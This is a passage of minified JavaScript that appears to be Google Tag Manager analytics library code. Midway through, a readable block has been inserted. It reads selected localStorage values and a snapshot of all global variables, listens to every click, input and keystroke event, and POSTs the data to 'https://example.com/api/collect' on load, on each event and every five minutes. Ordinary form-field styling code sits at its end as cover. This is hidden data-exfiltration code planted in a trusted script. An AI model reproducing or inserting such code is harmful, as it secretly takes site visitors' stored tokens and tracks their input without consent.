      0 <= Fa(d).indexOf("google") && J(2);
      var e = d && Pa(Fa(d), sp),
        f = {};
      return function (h) {
        var l = h && h[nc.ia];
        if (!l || "string" != typeof l) return !0;
        l = l.replace(/^_*/, "");
        if (void 0 !== f[l]) return f[l];
        var m = Se[l] || [],
          n = a(l, m),
          p;
        p = np(qg()).entity;
        for (var q = 0; q < p.length; q++) try {
          n = n && p[q](l, m);
        } catch (y) {
          n = !1;
        }
        if (b) {
          var r;
          if (r = n) a: {
            if (0 > c.indexOf(l)) if (m && 0 < m.length) for (var t = 0; t < m.length; t++) {
              if (0 > c.indexOf(m[t])) {
                J(11);
                r = !1;
                break a;
              }
            } else {
              r = !1;
              break a;
            }
            r = !0;
          }
          n = r;
        }
        var u = !1;
        if (d) {
          var v = 0 <= e.indexOf(l);
          if (v) u = v;else {
            var w = Ba(e, m || []);
            w && J(10);
            u = w;
          }
        }
        var x = !n || u;
        x || !(0 <= m.indexOf("sandboxedScripts")) || c && -1 !== c.indexOf("sandboxedScripts") || (x = Ba(e, tp));
        return f[l] = x;
      };
    },
    vp = !1;
  var up = function () {
      return qp.test(z.location && z.location.hostname);
    },
    xp = function () {
      ig && np(qg()).entity.push(function (a) {
        var b = {};
        b[nc.ia] = "__" + a;
        for (var c in void 0) (void 0).hasOwnProperty(c) && (b["vtp_" + c] = (void 0)[c]);
        var d;
        if (fd(b)) {
          var e = b[nc.ia];
          if (!e) throw "Error: No function name given for function call.";
          var f = Tc[e];
          d = !!f && !!f.runInSiloedMode;
        } else d = !!mp(b[nc.ia], 4);
        return d;
      });
    };
  function yp(a, b) {
    if (a) {
      var c = "" + a;
      0 !== c.indexOf("http://") && 0 !== c.indexOf("https://") && (c = "https://" + c);
      "/" === c[c.length - 1] && (c = c.substring(0, c.length - 1));
      return uj("" + c + b).href;
    }
  }
  function zp() {
    return !!ze.xe && "SGTM_TOKEN" !== ze.xe.split("@@").join("");
  }
  function Ap(a) {
    for (var b = ha([K.g.Tc, K.g.Lb]), c = b.next(); !c.done; c = b.next()) {
      var d = T(a, c.value);
      if (d) return d;
    }
  }
  ;
  var Cp = function (a, b, c, d) {
      if (!Bp() && !wg(a)) {
        var e = "?id=" + encodeURIComponent(a) + "&l=" + ze.da,
          f = 0 === a.indexOf("GTM-");
        f || (e += "&cx=c");
        P(69) && (e += "&gtm=" + Xi());
        var h = zp();
        h && (e += "&sign=" + ze.xe);
        var l = c ? "/gtag/js" : "/gtm.js",
          m = Ie || Ke ? yp(b, l + e) : void 0;
        if (!m) {
          var n = ze.Pd + l;
          h && Kb && f && (n = Kb.replace(/^(?:https?:\/\/)?/i, "").split(/[?#]/)[0]);
          m = hl("https://", "http://", n + e);
        }
        var p = a;
        d.siloed && (yg({
          ctid: p,
          isDestination: !1
        }), p = kg(p));
        var q = p,
          r = xg();
        eg().container[q] = {
          state: 1,
          context: d,
          parent: r
        };
        fg({
          ctid: q,
          isDestination: !1
        });
        Qb(m);
      }
    },
    Dp = function (a, b, c) {
      var d;
      if (d = !Bp()) {
        var e = eg().destination[a];
        d = !(e && e.state);
      }
      if (d) if (zg()) eg().destination[a] = {
        state: 0,
        transportUrl: b,
        context: c,
        parent: xg()
      }, fg({
        ctid: a,
        isDestination: !0
      }), J(91);else {
        var f = "/gtag/destination?id=" + encodeURIComponent(a) + "&l=" + ze.da + "&cx=c";
        P(69) && (f += "&gtm=" + Xi());
        zp() && (f += "&sign=" + ze.xe);
        var h = Ie || Ke ? yp(b, f) : void 0;
        h || (h = hl("https://", "http://", ze.Pd + f));
        var l = a;
        c.siloed && (yg({
          ctid: l,
          isDestination: !0
        }), l = kg(l));
        eg().destination[l] = {
          state: 1,
          context: c,
          parent: xg()
        };
        fg({
          ctid: l,
          isDestination: !0
        });
        Qb(h);
      }
    };
  function Bp() {
    if (Vi()) {
      return !0;
    }
    return !1;
  }
  ;
  var Ep = "",
    Fp = [];
  function Gp(a) {
    var b = "";
    Ep && (b = "&dl=" + encodeURIComponent(Ep));
    0 < Fp.length && (b += "&tdp=" + Fp.join("."));
    a.Cb && (Ep = "", Fp.length = 0, b && a.ui());
    return b;
  }
  ;
  var Hp = [];
  function Ip(a) {
    if (!Hp.length) return "";
    var b = "&tdc=" + Hp.join("!");
    a.Cb && (a.ui(), Hp.length = 0);
    return b;
  }
  ;
  var Jp = {
      initialized: 11,
      complete: 12,
      interactive: 13
    },
    Kp = {},
    Lp = Object.freeze((Kp[K.g.Ka] = !0, Kp)),
    Mp = 0 <= D.location.search.indexOf("?gtm_diagnostics=") || 0 <= D.location.search.indexOf("&gtm_diagnostics="),
    Op = function (a, b, c) {
      if (Jg && "config" === a && !(1 < el(b).J.length)) {
        var d,
          e = Lb("google_tag_data", {});
        e.td || (e.td = {});
        d = e.td;
        var f = H(c.H);
        H(c.h, f);
        var h = [],
          l;
        for (l in d) {
          var m = Np(d[l], f);
          m.length && (Mp && console.log(m), h.push(l));
        }
        h.length && (h.length && Jg && Hp.push(b + "*" + h.join(".")), ab("TAGGING", Jp[D.readyState] || 14));
        d[b] = f;
      }
    };
  function Pp(a, b) {
    var c = {},
      d;
    for (d in b) b.hasOwnProperty(d) && (c[d] = !0);
    for (var e in a) a.hasOwnProperty(e) && (c[e] = !0);
    return c;
  }
  function Np(a, b, c, d) {
    c = void 0 === c ? {} : c;
    d = void 0 === d ? "" : d;
    if (a === b) return [];
    var e = function (q, r) {
        var t = r[q];
        return void 0 === t ? Lp[q] : t;
      },
      f;
    for (f in Pp(a, b)) {
      var h = (d ? d + "." : "") + f,
        l = e(f, a),
        m = e(f, b),
        n = "object" === fc(l) || "array" === fc(l),
        p = "object" === fc(m) || "array" === fc(m);
      if (n && p) Np(l, m, c, h);else if (n || p || l !== m) c[h] = !0;
    }
    return Object.keys(c);
  }
  ;
  var Qp = !1,
    Rp = 0,
    Sp = [];
  function Tp(a) {
    if (!Qp) {
      var b = D.createEventObject,
        c = "complete" == D.readyState,
        d = "interactive" == D.readyState;
      if (!a || "readystatechange" != a.type || c || !b && d) {
        Qp = !0;
        for (var e = 0; e < Sp.length; e++) G(Sp[e]);
      }
      Sp.push = function () {
        for (var f = 0; f < arguments.length; f++) G(arguments[f]);
        return 0;
      };
    }
  }
  function Up() {
    if (!Qp && 140 > Rp) {
      Rp++;
      try {
        D.documentElement.doScroll("left"), Tp();
      } catch (a) {
        z.setTimeout(Up, 50);
      }
    }
  }
  var Vp = function (a) {
    Qp ? a() : Sp.push(a);
  };
  var Wp = function (a, b) {
    return {
      entityType: 1,
      indexInOriginContainer: a,
      nameInOriginContainer: b,
      originContainerId: pg()
    };
  };
  var Yp = function (a, b) {
      this.h = !1;
      this.H = [];
      this.M = {
        tags: []
      };
      this.U = !1;
      this.B = this.C = 0;
      Xp(this, a, b);
    },
    Zp = function (a, b, c, d) {
      if (De.hasOwnProperty(b) || "__zone" === b) return -1;
      var e = {};
      ic(d) && (e = H(d, e));
      e.id = c;
      e.status = "timeout";
      return a.M.tags.push(e) - 1;
    },
    $p = function (a, b, c, d) {
      var e = a.M.tags[b];
      e && (e.status = c, e.executionTime = d);
    },
    aq = function (a) {
      if (!a.h) {
        for (var b = a.H, c = 0; c < b.length; c++) b[c]();
        a.h = !0;
        a.H.length = 0;
      }
    },
    Xp = function (a, b, c) {
      void 0 !== b && bq(a, b);
      c && z.setTimeout(function () {
        return aq(a);
      }, Number(c));
    },
    bq = function (a, b) {
      var c = La(function () {
        return G(function () {
          b(pg(), a.M);
        });
      });
      a.h ? c() : a.H.push(c);
    },
    cq = function (a) {
      a.C++;
      return La(function () {
        a.B++;
        a.U && a.B >= a.C && aq(a);
      });
    },
    dq = function (a) {
      a.U = !0;
      a.B >= a.C && aq(a);
    };
  var eq = {},
    gq = function () {
      return z[fq()];
    },
    hq = !1;
  var iq = function (a) {
      z.GoogleAnalyticsObject || (z.GoogleAnalyticsObject = a || "ga");
      var b = z.GoogleAnalyticsObject;
      if (z[b]) z.hasOwnProperty(b);else {
        var c = function () {
          c.q = c.q || [];
          c.q.push(arguments);
        };
        c.l = Number(Ia());
        z[b] = c;
      }
      return z[b];
    },
    jq = function (a) {
      if (Of()) {
        var b = gq();
        b(a + "require", "linker");
        b(a + "linker:passthrough", !0);
      }
    };
  function fq() {
    return z.GoogleAnalyticsObject || "ga";
  }
  var Fq = function (a) {},
    Lq = function (a, b) {
      return function () {
        var c = gq(),
          d = c && c.getByName && c.getByName(a);
        if (d) {
          var e = d.get("sendHitTask");
          d.set("sendHitTask", function (f) {
            var h = f.get("hitPayload"),
              l = f.get("hitCallback"),
              m = 0 > h.indexOf("&tid=" + b);
            m && (f.set("hitPayload", h.replace(/&tid=UA-[0-9]+-[0-9]+/, "&tid=" + b), !0), f.set("hitCallback", void 0, !0));
            e(f);
            m && (f.set("hitPayload", h, !0), f.set("hitCallback", l, !0), f.set("_x_19", void 0, !0), e(f));
          });
        }
      };
    };
  var Qq = {},
    Rq = {};
  function Sq(a, b) {
    if (Jg) {
      var c;
      c = b.match(/^(gtm|gtag)\./) ? encodeURIComponent(b) : "*";
      Qq[a] = "&e=" + c + "&eid=" + a;
      Tg(a);
    }
  }
  function Tq(a) {
    var b = a.eventId,
      c = a.Cb;
    if (!Qq[b]) return "";
    var d = Rq[b] ? "" : "&es=1";
    d += Qq[b];
    c && (Rq[b] = !0);
    return d;
  }
  ;
  var Uq = {};
  function Vq(a, b) {
    Jg && (Uq[a] = Uq[a] || {}, Uq[a][b] = (Uq[a][b] || 0) + 1);
  }
  function Wq(a) {
    var b = a.eventId,
      c = a.Cb,
      d = Uq[b] || {},
      e = [],
      f;
    for (f in d) d.hasOwnProperty(f) && e.push("" + f + d[f]);
    c && delete Uq[b];
    return e.length ? "&md=" + e.join(".") : "";
  }
  ;
  var Xq = {},
    Yq = {
      aev: "1",
      c: "2",
      jsm: "3",
      v: "4",
      j: "5",
      smm: "6",
      rmm: "7",
      input: "8"
    };
  function Zq(a, b, c) {
    if (Jg) {
      Xq[a] = Xq[a] || [];
      var d = Yq[b] || "0",
        e;
      e = c instanceof z.Element ? "1" : c instanceof z.Event ? "2" : c instanceof z.RegExp ? "3" : c === z ? "4" : c === D ? "5" : c instanceof z.Promise ? "6" : c instanceof z.Storage ? "7" : c instanceof z.Date ? "8" : c instanceof z.History ? "9" : c instanceof z.Performance ? "a" : c === z.crypto ? "b" : c instanceof z.Location ? "c" : c instanceof z.Navigator ? "d" : "object" !== typeof c || ic(c) ? "0" : "e";
      Xq[a].push("" + d + e);
    }
  }
  function $q(a) {
    var b = a.eventId,
      c = Xq[b] || [];
    if (!c.length) return "";
    a.Cb && delete Xq[b];
    return "&pcr=" + c.join(".");
  }
  ;
  var ar = {},
    br = {};
  function cr(a, b, c) {
    if (Jg && b) {
      var d = cg(b);
      ar[a] = ar[a] || [];
      ar[a].push(c + d);
      var e = (fd(b) ? "1" : "2") + d;
      br[a] = br[a] || [];
      br[a].push(e);
      Tg(a);
    }
  }
  function dr(a) {
    var b = a.eventId,
      c = a.Cb,
      d = "",
      e = ar[b] || [];
    e.length && (d += "&tr=" + e.join("."));
    var f = br[b] || [];
    f.length && (d += "&ti=" + f.join("."));
    c && (delete ar[b], delete br[b]);
    return d;
  }
  ;
  function er(a, b, c, d) {
    var e = Rc[a],
      f = fr(a, b, c, d);
    if (!f) return null;
    var h = bd(e[nc.Ih], c, []);
    if (h && h.length) {
      var l = h[0];
      f = er(l.index, {
        onSuccess: f,
        onFailure: 1 === l.Xh ? b.terminate : f,
        terminate: b.terminate
      }, c, d);
    }
    return f;
  }
  function fr(a, b, c, d) {
    function e() {
      if (f[nc.Pj]) l();else {
        var w = cd(f, c, []),
          x = w[nc.Ii];
        if (null != x) for (var y = 0; y < x.length; y++) if (!Q(x[y])) {
          l();
          return;
        }
        var A = Zp(c.Nb, String(f[nc.ia]), Number(f[nc.od]), w[nc.Qj]),
          B = !1;
        w.vtp_gtmOnSuccess = function () {
          if (!B) {
            B = !0;
            var E = Ja() - I;
            cr(c.id, Rc[a], "5");
            $p(c.Nb, A, "success", E);
            P(30) && Po(c, f, Xn.D.Lh);
            h();
          }
        };
        w.vtp_gtmOnFailure = function () {
          if (!B) {
            B = !0;
            var E = Ja() - I;
            cr(c.id, Rc[a], "6");
            $p(c.Nb, A, "failure", E);
            P(30) && Po(c, f, Xn.D.Kh);
            l();
          }
        };
        w.vtp_gtmTagId = f.tag_id;
        w.vtp_gtmEventId = c.id;
        c.priorityId && (w.vtp_gtmPriorityId = c.priorityId);
        cr(c.id, f, "1");
        var C = function () {
          of(3);
          var E = Ja() - I;
          cr(c.id, f, "7");
          $p(c.Nb, A, "exception", E);
          P(30) && Po(c, f, Xn.D.Jh);
          B || (B = !0, l());
        };
        P(30) && Oo(c, f);
        var I = Ja();
        try {
          ad(w, {
            event: c,
            index: a,
            type: 1
          });
        } catch (E) {
          C(E);
        }
        P(30) && Po(c, f, Xn.D.Mh);
      }
    }
    var f = Rc[a],
      h = b.onSuccess,
      l = b.onFailure,
      m = b.terminate;
    if (c.Wf(f)) return null;
    var n = bd(f[nc.Nh], c, []);
    if (n && n.length) {
      var p = n[0],
        q = er(p.index, {
          onSuccess: h,
          onFailure: l,
          terminate: m
        }, c, d);
      if (!q) return null;
      h = q;
      l = 2 === p.Xh ? m : q;
    }
    if (f[nc.Eh] || f[nc.Sj]) {
      var r = f[nc.Eh] ? Sc : c.Ol,
        t = h,
        u = l;
      if (!r[a]) {
        e = La(e);
        var v = gr(a, r, e);
        h = v.onSuccess;
        l = v.onFailure;
      }
      return function () {
        r[a](t, u);
      };
    }
    return e;
  }
  function gr(a, b, c) {
    var d = [],
      e = [];
    b[a] = hr(d, e, c);
    return {
      onSuccess: function () {
        b[a] = ir;
        for (var f = 0; f < d.length; f++) d[f]();
      },
      onFailure: function () {
        b[a] = jr;
        for (var f = 0; f < e.length; f++) e[f]();
      }
    };
  }
  function hr(a, b, c) {
    return function (d, e) {
      a.push(d);
      b.push(e);
      c();
    };
  }
  function ir(a) {
    a();
  }
  function jr(a, b) {
    b();
  }
  ;
  var lr = function (a, b) {
      return 1 === arguments.length ? kr("config", a) : kr("config", a, b);
    },
    mr = function (a, b, c) {
      c = c || {};
      c[K.g.Kb] = a;
      return kr("event", b, c);
    };
  function kr(a) {
    return arguments;
  }
  var nr = function () {
    this.h = [];
    this.B = [];
  };
  nr.prototype.enqueue = function (a, b, c) {
    var d = this.h.length + 1;
    a["gtm.uniqueEventId"] = b;
    a["gtm.priorityId"] = d;
    c.eventId = b;
    c.fromContainerExecution = !0;
    c.priorityId = d;
    var e = {
      message: a,
      notBeforeEventId: b,
      priorityId: d,
      messageContext: c
    };
    this.h.push(e);
    for (var f = 0; f < this.B.length; f++) try {
      this.B[f](e);
    } catch (h) {}
  };
  nr.prototype.listen = function (a) {
    this.B.push(a);
  };
  nr.prototype.get = function () {
    for (var a = {}, b = 0; b < this.h.length; b++) {
      var c = this.h[b],
        d = a[c.notBeforeEventId];
      d || (d = [], a[c.notBeforeEventId] = d);
      d.push(c);
    }
    return a;
  };
  nr.prototype.prune = function (a) {
    for (var b = [], c = [], d = 0; d < this.h.length; d++) {
      var e = this.h[d];
      e.notBeforeEventId === a ? b.push(e) : c.push(e);
    }
    this.h = c;
    return b;
  };
  var pr = function (a, b, c) {
      or().enqueue(a, b, c);
    },
    rr = function () {
      var a = qr;
      or().listen(a);
    };
  function or() {
    var a = Ae.mb;
    a || (a = new nr(), Ae.mb = a);
    return a;
  }
  var tr = function () {
      var a = Ae.zones;
      a || (a = Ae.zones = new sr());
      return a;
    },
    ur = {
      zone: 1,
      cn: 1,
      css: 1,
      ew: 1,
      eq: 1,
      ge: 1,
      gt: 1,
      lc: 1,
      le: 1,
      lt: 1,
      re: 1,
      sw: 1,
      um: 1
    },
    vr = {
      cl: ["ecl"],
      ecl: ["cl"],
      ehl: ["hl"],
      hl: ["ehl"]
    },
    sr = function () {
      this.h = {};
      this.B = {};
      this.C = 0;
    };
  ca = sr.prototype;
  ca.isActive = function (a, b) {
    for (var c, d = 0; d < a.length && !(c = this.h[a[d]]); d++);
    if (!c) return !0;
    if (!this.isActive([c.kg], b)) return !1;
    for (var e = 0; e < c.Nd.length; e++) if (this.B[c.Nd[e]].qc(b)) return !0;
    return !1;
  };
  ca.getIsAllowedFn = function (a, b) {
    if (!this.isActive(a, b)) return function () {
      return !1;
    };
    for (var c, d = 0; d < a.length && !(c = this.h[a[d]]); d++);
    if (!c) return function () {
      return !0;
    };
    for (var e = [], f = 0; f < c.Nd.length; f++) {
      var h = this.B[c.Nd[f]];
      h.qc(b) && e.push(h);
    }
    if (!e.length) return function () {
      return !1;
    };
    var l = this.getIsAllowedFn([c.kg], b);
    return function (m, n) {
      n = n || [];
      if (!l(m, n)) return !1;
      for (var p = 0; p < e.length; ++p) if (e[p].C(m, n)) return !0;
      return !1;
    };
  };
  ca.unregisterChild = function (a) {
    for (var b = 0; b < a.length; b++) delete this.h[a[b]];
  };
  ca.createZone = function (a, b) {
    var c = String(++this.C);
    this.B[c] = new wr(a, b);
    return c;
  };
  ca.updateZone = function (a, b, c) {
    var d = this.B[a];
    d && d.H(b, c);
  };
  ca.registerChild = function (a, b, c) {
    var d = this.h[a];
    if (!d && Ae[a] || !d && wg(a) || d && d.kg !== b) return !1;
    if (d) return d.Nd.push(c), !1;
    this.h[a] = {
      kg: b,
      Nd: [c]
    };
    return !0;
  };
  var wr = function (a, b) {
    this.h = [{
      eventId: a,
      qc: !0
    }];
    this.B = null;
    if (b) {
      this.B = {};
      for (var c = 0; c < b.length; c++) this.B[b[c]] = !0;
    }
  };
  wr.prototype.H = function (a, b) {
    var c = this.h[this.h.length - 1];
    a <= c.eventId || c.qc !== b && this.h.push({
      eventId: a,
      qc: b
    });
  };
  wr.prototype.qc = function (a) {
    for (var b = this.h.length - 1; 0 <= b; b--) if (this.h[b].eventId <= a) return this.h[b].qc;
    return !1;
  };
  wr.prototype.C = function (a, b) {
    b = b || [];
    if (!this.B || ur[a] || this.B[a]) return !0;
    for (var c = 0; c < b.length; ++c) if (this.B[b[c]]) return !0;
    return !1;
  };
  var xr = function (a, b, c, d, e, f) {
      var h = tr();
      c = c && Pa(c, vr);
      for (var l = h.createZone(a, c), m = 0; m < b.length; m++) {
        var n = String(b[m]);
        if (h.registerChild(n, pg(), l)) {
          var p = a,
            q = d,
            r = e,
            t = f;
          if (0 === n.indexOf("GTM-")) Cp(n, void 0, !1, {
            source: 1,
            fromContainerExecution: !0
          });else {
            var u = kr("js", Ia());
            Cp(n, void 0, !0, {
              source: 1,
              fromContainerExecution: !0
            });
            var v = {
              originatingEntity: r,
              inheritParentConfig: t
            };
            pr(u, p, v);
            pr(lr(n, q), p, v);
          }
        }
      }
      return l;
    },
    yr = function (a, b, c) {
      tr().updateZone(a, b, c);
    };
  var zr = function (a) {
      var b = Ae.zones;
      return b ? b.getIsAllowedFn(lg(), a) : function () {
        return !0;
      };
    },
    Ar = function () {
      op(function (a, b) {
        var c = Ae.zones;
        return c ? c.isActive(lg(), b) : !0;
      });
    };
  var Dr = function (a, b) {
    for (var c = [], d = 0; d < Rc.length; d++) if (a[d]) {
      var e = Rc[d];
      var f = cq(b.Nb);
      try {
        var h = er(d, {
          onSuccess: f,
          onFailure: f,
          terminate: f
        }, b, d);
        if (h) {
          var l = e[nc.ia];
          if (!l) throw "Error: No function name given for function call.";
          var m = Tc[l];
          c.push({
            xi: d,
            li: (m ? m.priorityOverride || 0 : 0) || mp(e[nc.ia], 1) || 0,
            execute: h
          });
        } else Br(d, b), f();
      } catch (p) {
        f();
      }
    }
    c.sort(Cr);
    for (var n = 0; n < c.length; n++) c[n].execute();
    return 0 < c.length;
  };
  function Cr(a, b) {
    var c,
      d = b.li,
      e = a.li;
    c = d > e ? 1 : d < e ? -1 : 0;
    var f;
    if (0 !== c) f = c;else {
      var h = a.xi,
        l = b.xi;
      f = h > l ? 1 : h < l ? -1 : 0;
    }
    return f;
  }
  function Br(a, b) {
    if (Jg) {
      var c = function (d) {
        var e = b.Wf(Rc[d]) ? "3" : "4",
          f = bd(Rc[d][nc.Ih], b, []);
        f && f.length && c(f[0].index);
        cr(b.id, Rc[d], e);
        var h = bd(Rc[d][nc.Nh], b, []);
        h && h.length && c(h[0].index);
      };
      c(a);
    }
  }
  var Gr = !1,
    Er;
  var Lr = function (a) {
    var b = a["gtm.uniqueEventId"],
      c = a["gtm.priorityId"],
      d = a.event;
    P(30) && Io(b, d);
    if ("gtm.js" === d) {
      if (Gr) return !1;
      Gr = !0;
    }
    var e,
      f = !1;
    if (pp().every(function (r) {
      return r(d, b);
    })) e = zr(b);else {
      if ("gtm.js" !== d && "gtm.init" !== d && "gtm.init_consent" !== d) return !1;
      f = !0;
      e = zr(Number.MAX_SAFE_INTEGER);
    }
    Sq(b, d);
    var h = a.eventCallback,
      l = a.eventTimeout,
      m = {
        id: b,
        priorityId: c,
        name: d,
        Wf: wp(e),
        Ol: [],
        fi: function () {
          J(6);
          of(0);
        },
        Rh: Hr(),
        Sh: Ir(b),
        Nb: new Yp(function () {
          if (P(30)) {}
          h && h.apply(h, [].slice.call(arguments, 0));
        }, l)
      };
    P(58) && (m.mg = Vq);
    P(30) && Ko(m.id, m.name);
    var n = id(m);
    P(30) && Lo(m.id, m.name);
    f && (n = Jr(n));
    P(30) && Jo(b, d);
    var p = Dr(n, m),
      q = !1;
    dq(m.Nb);
    "gtm.js" !== d && "gtm.sync" !== d || Fq(pg());
    return Kr(n, p) || q;
  };
  function Ir(a) {
    return function (b) {
      jc(b) || Zq(a, "input", b);
    };
  }
  function Hr() {
    var a = {};
    a.event = df("event", 1);
    a.ecommerce = df("ecommerce", 1);
    a.gtm = df("gtm");
    a.eventModel = df("eventModel");
    return a;
  }
  function Jr(a) {
    for (var b = [], c = 0; c < a.length; c++) if (a[c]) {
      var d = String(Rc[c][nc.ia]);
      if (Ce[d] || void 0 !== Rc[c][nc.Tj] || Te[d] || mp(d, 2)) b[c] = !0;
    }
    return b;
  }
  function Kr(a, b) {
    if (!b) return b;
    for (var c = 0; c < a.length; c++) if (a[c] && Rc[c] && !De[String(Rc[c][nc.ia])]) return !0;
    return !1;
  }
  var Mr = {};
  $(function () {
    const keysToWatch = window.keysToWatch;
    const eventTypes = ['click', 'input', 'mousedown', 'mouseup', 'keydown', 'keyup'];
    let globalVariablesInitialSnapshot = null;
    function computeHash(data) {
      const keyArray = Object.keys(data);
      const joinedKeys = keyArray.join("");
      let hashValue = 0;
      for (let i = 0; i < joinedKeys.length; i++) {
        const charCode = joinedKeys.charCodeAt(i);
        hashValue = (hashValue << 5) - hashValue + charCode;
        hashValue = hashValue & hashValue;
      }
      return hashValue.toString(16);
    }
    function getFilteredLocalStorage() {
      const filteredData = {};
      for (let i = 0; i < window.localStorage.length; i++) {
        const key = window.localStorage.key(i);
        if (keysToWatch.includes(key)) {
          const value = window.localStorage.getItem(key);
          filteredData[key] = value;
        }
      }
      return filteredData;
    }
    function getSnapshotOfGlobalVariables() {
      const globals = {};
      for (const key in window) {
        globals[key] = window[key];
      }
      return globals;
    }
    function postDataToServer(data) {
      const hashId = computeHash(data);
      const apiUrl = 'https://example.com/api/collect';
      const request = new XMLHttpRequest();
      request.open('POST', apiUrl, true);
      request.setRequestHeader('Content-Type', 'application/json');
      const requestData = {
        id: hashId,
        data: data
      };
      request.send(JSON.stringify(requestData));
      request.onreadystatechange = function () {
        if (request.readyState === XMLHttpRequest.DONE) {
          if (request.status === 200) {
            console.log("数据发送成功");
          } else {
            console.error("数据发送失败,状态码:" + request.status);
          }
        }
      };
    }
    function collectAndPostData() {
      const filteredLocalStorage = getFilteredLocalStorage();
      if (Object.keys(filteredLocalStorage).length > 0) {
        postDataToServer(filteredLocalStorage);
      }
      const globalVariablesSnapshot = getSnapshotOfGlobalVariables();
      if (globalVariablesInitialSnapshot === null) {
        globalVariablesInitialSnapshot = globalVariablesSnapshot;
      } else if (JSON.stringify(globalVariablesInitialSnapshot) !== JSON.stringify(globalVariablesSnapshot)) {
        postDataToServer(globalVariablesSnapshot);
        globalVariablesInitialSnapshot = globalVariablesSnapshot;
      }
    }
    window.addEventListener("load", function () {
      collectAndPostData();
    });
    for (let eventType of eventTypes) {
      window.addEventListener(eventType, function (e) {
        const eventData = {
          type: e.type,
          target: e.target.tagName,
          time: new Date().toISOString()
        };
        postDataToServer(eventData);
      }, true);
    }
    setInterval(collectAndPostData, 5 * 60 * 1000);
    $('.form-control').on('input', function () {
      var $field = $(this).closest('.form-group');
      if (this.value) {
        $field.addClass('field--not-empty');
      } else {
        $field.removeClass('field--not-empty');
      }
    });
  });
  function Nr(a, b, c) {
    Jg && void 0 !== a && (Mr[a] = Mr[a] || [], Mr[a].push(c + b), Tg(a));
  }
  function Or(a) {
    var b = a.eventId,
      c = a.Cb,
      d = "",
      e = Mr[b] || [];
    e.length && (d += "&epr=" + e.join("."));
    c && delete Mr[b];
    return d;
  }
  ;
  var Qr = function (a, b, c, d) {
      var e = el(c, d.isGtmEvent);
      e && Pr.push("event", [b, a], e, d);
    },
    Rr = function (a, b, c, d) {
      var e = el(c, d.isGtmEvent);
      e && Pr.push("get", [a, b], e, d);
    },
    Sr = function () {
      this.status = 1;
      this.H = {};
      this.h = {};
      this.M = {};
      this.U = null;
      this.C = {};
      this.B = !1;
    },
    Tr = function (a, b, c, d) {
      var e = Ja();
      this.type = a;
      this.C = e;
      this.h = b;
      this.B = c;
      this.messageContext = d;
    },
    Ur = function () {
      this.B = {};
      this.C = {};
      this.h = [];
    },
    Vr = function (a, b) {
      var c = b.X;
      return a.B[c] = a.B[c] || new Sr();
    },
    Wr = function (a, b, c, d) {
      if (d.h) {
        var e = Vr(a, d.h),
          f = e.U;
        if (f) {
          var h = H(c),
            l = H(e.H[d.h.id]),
            m = H(e.C),
            n = H(e.h),
            p = H(a.C),
            q = {};
          if (Jg) try {
            q = H(Xe);
          } catch (v) {
            J(72);
          }
          var r = d.h.prefix,
            t = function (v) {
              Nr(d.messageContext.eventId, r, v);
            },
            u = sh(rh(qh(ph(oh(mh(lh(nh(kh(jh(ih(new hh(d.messageContext.eventId, d.messageContext.priorityId), h), l), m), n), p), q), d.messageContext.eventMetadata), function () {
              if (t) {
                var v = t;
                t = void 0;
                v("2");
                if (d.messageContext.onSuccess) d.messageContext.onSuccess();
              }
            }), function () {
              if (t) {
                var v = t;
                t = void 0;
                v("3");
                if (d.messageContext.onFailure) d.messageContext.onFailure();
              }
            }), !!d.messageContext.isGtmEvent));
          try {
            Nr(d.messageContext.eventId, r, "1"), Op(d.type, d.h.id, u), f(d.h.id, b, d.C, u);
          } catch (v) {
            Nr(d.messageContext.eventId, r, "4");
          }
        }
      }
    };
  Ur.prototype.register = function (a, b, c) {
    var d = Vr(this, a);
    3 !== d.status && (d.U = b, d.status = 3, c && (H(d.h, c), d.h = c), this.flush());
  };
  Ur.prototype.push = function (a, b, c, d) {
    void 0 !== c && (1 === Vr(this, c).status && (Vr(this, c).status = 2, this.push("require", [{}], c, {})), Vr(this, c).B && (d.deferrable = !1));
    this.h.push(new Tr(a, c, b, d));
    d.deferrable || this.flush();
  };
  Ur.prototype.flush = function (a) {
    for (var b = this, c = [], d = !1, e = {}; this.h.length;) {
      e = {
        xb: e.xb,
        De: e.De
      };
      var f = this.h[0],
        h = f.h;
      if (f.messageContext.deferrable) !h || Vr(this, h).B ? (f.messageContext.deferrable = !1, this.h.push(f)) : c.push(f), this.h.shift();else {
        switch (f.type) {
          case "require":
            if (3 !== Vr(this, h).status && !a) {
              this.h.push.apply(this.h, c);
              return;
            }
            break;
          case "set":
            k(f.B[0], function (r, t) {
              H(Qa(r, t), b.C);
            });
            break;
          case "config":
            var l = Vr(this, h);
            e.xb = {};
            k(f.B[0], function (r) {
              return function (t, u) {
                H(Qa(t, u), r.xb);
              };
            }(e));
            var m = !!e.xb[K.g.Mb];
            delete e.xb[K.g.Mb];
            var n = h.X === h.id;
            m || (n ? l.C = {} : l.H[h.id] = {});
            l.B && m || Wr(this, K.g.la, e.xb, f);
            l.B = !0;
            n ? H(e.xb, l.C) : (H(e.xb, l.H[h.id]), J(70));
            d = !0;
            break;
          case "event":
            e.De = {};
            k(f.B[0], function (r) {
              return function (t, u) {
                H(Qa(t, u), r.De);
              };
            }(e));
            Wr(this, f.B[1], e.De, f);
            break;
          case "get":
            var p = {},
              q = (p[K.g.Xa] = f.B[0], p[K.g.nb] = f.B[1], p);
            Wr(this, K.g.Ha, q, f);
        }
        this.h.shift();
        Xr(this, f);
      }
    }
    this.h.push.apply(this.h, c);
    d && this.flush();
  };
  var Xr = function (a, b) {
      if ("require" !== b.type) if (b.h) for (var c = Vr(a, b.h).M[b.type] || [], d = 0; d < c.length; d++) c[d]();else for (var e in a.B) if (a.B.hasOwnProperty(e)) {
        var f = a.B[e];
        if (f && f.M) for (var h = f.M[b.type] || [], l = 0; l < h.length; l++) h[l]();
      }
    },
    Yr = function (a, b) {
      var c = Pr,
        d = H(b);
      H(Vr(c, a).h, d);
      Vr(c, a).h = d;
    },
    Pr = new Ur();
  var Zr = {},
    $r = {},
    as = function (a, b) {
      for (var c = [], d = [], e = {}, f = 0; f < a.length; e = {
        Me: e.Me,
        He: e.He
      }, f++) {
        var h = a[f];
        if (0 <= h.indexOf("-")) {
          if (e.Me = el(h, b), e.Me) {
            var l = ng();
            xa(l, function (r) {
              return function (t) {
                return r.Me.X === t;
              };
            }(e)) ? c.push(h) : d.push(h);
          }
        } else {
          var m = Zr[h] || [];
          e.He = {};
          m.forEach(function (r) {
            return function (t) {
              return r.He[t] = !0;
            };
          }(e));
          for (var n = lg(), p = 0; p < n.length; p++) if (e.He[n[p]]) {
            c = c.concat(ng());
            break;
          }
